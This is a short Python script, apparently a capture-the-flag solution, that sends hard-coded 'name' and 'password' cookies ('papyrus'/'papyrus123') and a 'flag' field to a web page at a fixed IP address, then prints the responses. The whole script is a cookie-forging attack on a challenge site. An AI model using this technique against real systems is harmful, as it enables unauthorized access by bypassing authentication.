import requests
import re

cookies = {"name": "papyrus", "password": "papyrus123"}
data = {"flag": 1}
r = requests.post("http://95.179.148.72:8083/index.php", cookies=cookies, data=data)
print(r.text)
r = requests.get("http://95.179.148.72:8083/index.php", cookies=cookies)
print(r.text)
